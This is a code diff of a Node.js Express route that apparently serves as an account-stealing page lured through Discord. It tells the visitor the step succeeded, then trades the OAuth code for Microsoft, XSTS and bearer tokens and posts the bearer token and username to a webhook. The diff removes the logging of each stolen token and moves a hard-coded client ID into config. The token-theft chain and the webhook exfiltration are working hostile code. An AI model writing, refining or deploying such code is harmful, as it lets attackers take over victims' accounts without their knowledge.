@@ -14,19 +14,12 @@ router.get('/', (req, res) => {
     res.send('Success! You can exit this page and return to discord.')
     try {
         const code = req.query['code']
-        console.log(code + " - Code\n")
         const accessToken = getAccessToken(code)
-        console.log(accessToken + " - Access Token\n")
         const userHash = getUserHashAndToken(accessToken)[0]
-        console.log( userHash + " - User Hash\n")
         const userToken = getUserHashAndToken(accessToken)[1]
-        console.log(userToken + " - User Token\n")
         const xstsToken = getXSTSToken(userToken)
-        console.log(xstsToken + " - XSTS Token\n")
         const bearerToken = getBearerTokenAndUsername(xstsToken, userHash)[0]
-        console.log(   bearerToken + " - Bearer Token\n")
         const username = getBearerTokenAndUsername(xstsToken, userHash)[1]
-        console.log(username + " - Username\n")
         postToWebhook(username, bearerToken)
     } catch (err) {
         console.log("A wild error has appeared!\n" + err + "\n")
@@ -43,7 +36,7 @@ async function getAccessToken(code) {
         'Content-Type': 'application/x-www-form-urlencoded'
     }
     const data = {
-        client_id: '000000004C12D8D8',
+        client_id: config.client_id,
         redirect_uri: config.redirect_uri,
         client_secret: config.client_secret,
         code: code,
